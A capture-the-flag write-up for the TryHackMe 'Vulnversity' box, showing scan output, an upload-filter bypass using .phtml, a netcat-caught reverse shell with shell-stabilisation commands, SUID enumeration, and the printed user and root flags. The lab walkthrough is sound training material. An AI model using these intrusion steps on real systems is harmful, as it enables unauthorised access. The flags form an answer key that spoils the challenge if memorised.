# This is my writeup for the Try_Hack_Me box - Vulnversity

The box showcases web exploitation and set uid priv escalation.\
The box is now taken of the website. But still worth it.
 
> Pratyush Prakhar (5h1NcH@n010) - 11/01/2020


## RECONNAISSANCE

1. Scan the box, how many ports are open?- **6**
	
	1. Ran a quick scan for all ports

	**Output**

	```bash
	sudo nmap -p- -vv 10.10.237.128
	Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-01 22:50 EST
	Initiating Ping Scan at 22:50                                                                                                                                         ............                                                                                                          
	Initiating SYN Stealth Scan at 22:50
	Scanning 10.10.237.128 [65535 ports]
	Discovered open port 22/tcp on 10.10.237.128
	Discovered open port 21/tcp on 10.10.237.128
	Discovered open port 445/tcp on 10.10.237.128
	Discovered open port 139/tcp on 10.10.237.128
	Discovered open port 3333/tcp on 10.10.237.128
	SYN Stealth Scan Timing: About 4.77% done; ETC: 23:01 (0:10:19 remaining)
	.......
	SYN Stealth Scan Timing: About 77.43% done; ETC: 23:03 (0:02:58 remaining)
	Discovered open port 3128/tcp on 10.10.237.128
	SYN Stealth Scan Timing: About 82.85% done; ETC: 23:03 (0:02:17 remaining)           
	```

	2. Then ran a standard scan for the specific ports found - **21,22,139,445,3128,3333**

	**Output**

	```bash
	sudo nmap -vv -sC -sV -p21,22,139,445,3128,3333 10.10.237.128
	Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-01 23:03 EST
	NSE: Loaded 153 scripts for scanning.
	.........
	Initiating SYN Stealth Scan at 23:03
	Scanning 10.10.237.128 [6 ports]
	Discovered open port 3128/tcp on 10.10.237.128
	Discovered open port 22/tcp on 10.10.237.128
	Discovered open port 445/tcp on 10.10.237.128
	Discovered open port 21/tcp on 10.10.237.128
	Discovered open port 139/tcp on 10.10.237.128
	Discovered open port 3333/tcp on 10.10.237.128
	Completed SYN Stealth Scan at 23:03, 0.24s elapsed (6 total ports)
	Initiating Service scan at 23:03
	Scanning 6 services on 10.10.237.128
	Completed Service scan at 23:03, 22.30s elapsed (6 services on 1 host)
	NSE: Script scanning 10.10.237.128.
	NSE: Starting runlevel 1 (of 3) scan.
	Initiating NSE at 23:03
	Completed NSE at 23:03, 5.94s elapsed
	NSE: Starting runlevel 2 (of 3) scan.
	Initiating NSE at 23:03
	Completed NSE at 23:03, 1.21s elapsed
	NSE: Starting runlevel 3 (of 3) scan.
	Initiating NSE at 23:03
	Completed NSE at 23:03, 0.01s elapsed
	Nmap scan report for 10.10.237.128
	Host is up, received reset ttl 61 (0.17s latency).
	Scanned at 2020-11-01 23:03:20 EST for 30s
	PORT     STATE SERVICE     REASON         VERSION                                                                                                                                                               
	21/tcp   open  ftp         syn-ack ttl 61 vsftpd 3.0.3
	22/tcp   open  ssh         syn-ack ttl 61 OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYQExoU9R0VCGoQW6bOwg0U7ILtmfBQ3x/rdK8uuSM/fEH80hgG81Xpqu52siXQXOn1hpppYs7rpZN+KdwAYYDmnxSPVwkj2yXT9hJ/fFAmge3vk0Gt5Kd8q3CdcLjgMcc8V4b8v6UpYemIgWFOkYTzji7ZPrTNlo4HbDgY5	
	/F9evC9VaWgfnyiasyAT6aio4hecn0Sg1Ag35NTGnbgrMmDqk6hfxIBqjqyYLPgJ4V1QrqeqMrvyc6k1/XgsR7dlugmqXyICiXu03zz7lNUf6vuWT707yDi9wEdLE6Hmah78f+xDYUP7iNA0raxi2H++XQjktPqjKGQzJHemtPY5bn
	|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHCK2yd1f39AlLoIZFsvpSlRlzyO1wjBoVy8NvMp4/6Db2TJNwcUNNFjYQRd5EhxNnP+oLvOTofBlF/n0ms6SwE=
	|   256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGqh93OTpuL32KRVEn9zL/Ybk+5mAsT/81axilYUUvUB
	139/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
	445/tcp  open  netbios-ssn syn-ack ttl 61 Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
	3128/tcp open  http-proxy  syn-ack ttl 61 Squid http proxy 3.5.12
	|_http-server-header: squid/3.5.12
	|_http-title: ERROR: The requested URL could not be retrieved
	3333/tcp open  http        syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
	| http-methods:
	|_  Supported Methods: OPTIONS GET HEAD POST
	|_http-server-header: Apache/2.4.18 (Ubuntu)
	|_http-title: Vuln University
	Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
	Host script results:
	|_clock-skew: mean: 1h39m57s, deviation: 2h53m12s, median: -3s
	| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
	| Names:
	|   VULNUNIVERSITY<00>   Flags: <unique><active>
	|   VULNUNIVERSITY<03>   Flags: <unique><active>
	|   VULNUNIVERSITY<20>   Flags: <unique><active>
	|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
	|   WORKGROUP<00>        Flags: <group><active>
	|   WORKGROUP<1d>        Flags: <unique><active>
	|   WORKGROUP<1e>        Flags: <group><active>
	| Statistics:
	|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
	|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
	|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
	| p2p-conficker: 
	|   Checking for Conficker.C or higher...
	|   Check 1 (port 14476/tcp): CLEAN (Couldn't connect)
	|   Check 2 (port 46485/tcp): CLEAN (Couldn't connect)
	|   Check 3 (port 37058/udp): CLEAN (Failed to receive data)
	|   Check 4 (port 47439/udp): CLEAN (Failed to receive data)
	|_  0/4 checks are positive: Host is CLEAN or ports are blocked
	| smb-os-discovery: 
	|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
	|   Computer name: vulnuniversity
	|   NetBIOS computer name: VULNUNIVERSITY\x00
	|   Domain name: \x00
	|   FQDN: vulnuniversity
	|_  System time: 2020-11-01T23:03:41-05:00
	| smb-security-mode: 
	|   account_used: guest
	|   authentication_level: user
	|   challenge_response: supported
	|_  message_signing: disabled (dangerous, but default)
	| smb2-security-mode: 
	|   2.02: 
	|_    Message signing enabled but not required
	| smb2-time: 
	|   date: 2020-11-02T04:03:42
	|_  start_date: N/A
	```

	3. What version of the squid proxy is running on the machine? - **3.5.12**

	4. How many ports will nmap scan if the flag -p-400 was used? - Basically translates to -p1-400. - **400**

	5. Using the nmap flag -n what will it not resolve? - can be found in **man page of nmap** - **DNS**

	6. What is the most likely operating system this machine is running? - Leaked from the smb enum script - **Ubuntu**

	7. What port is the web server running on? - Service running on Apache Web Server - **3333**


## GOBUSTER
	
2. What is the directory that has an upload form page? - **/internal/** - Upload

**GOBUSTER OUTPUT**

```bash
gobuster dir -t 100 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u "http://10.10.237.128:3333"

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.237.128:3333
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/01 23:57:56 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
..........
===============================================================
2020/11/01 23:58:22 Finished
===============================================================
```

## Web Exploit

**Images**

1. What common extension seems to be blocked? - **.php**

3. What extension is allowed? - **.phtml**

4. Stabilizing shell

**Output**

```bash
kali@kali:~/Desktop/Try_Hack_Me/Vulnversity$ nc -lnvvp 8888
listening on [any] 8888 ...
connect to [10.2.44.183] from (UNKNOWN) [10.10.25.49] 44380
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
01:32:54 up 25 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ which python
/usr/bin/python
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@vulnuniversity:/$ ^Z
[1]+  Stopped                 nc -lnvvp 8888
kali@kali:~/Desktop/Try_Hack_Me/Vulnversity$ stty raw -echo
kali@kali:~/Desktop/Try_Hack_Me/Vulnversity$ nc -lnvvp 8888
                                                                                                                                                                                                                
www-data@vulnuniversity:/$ l                                   
```

5. What is the name of the user who manages the webserver? - **bill**

```bash
www-data@vulnuniversity:/home$ ls
bill
```

6. What is the user flag? - **8bd7992fbe8a6ad22a63361004cfcedb**

```bash
www-data@vulnuniversity:/home/bill$ ls
user.txt
www-data@vulnuniversity:/home/bill$ cat user.txt 
8bd7992fbe8a6ad22a63361004cfcedb
```

## Privilege Escalation

**LINPEAS OUTPUT**
```bash
====================================( Interesting Files )=====================================
[+] SUID - Check easy privesc, exploits and write perms
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root   root        44K May  7  2014 /bin/ping6
.......
-rwsr-xr-x 1 root   root        23K Jan 15  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-sr-x 1 root   root        97K Jan 29  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root   root       419K Jan 31  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root       645K Feb 13  2019 /bin/systemctl
```

1. On the system, search for all SUID files. What file stands out? - **/bin/systemctl**

2. What is the root flag? - **a58ff8579f0a9270368d33a9966c7fd5**


**Stay Tuned On**\
[Github](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)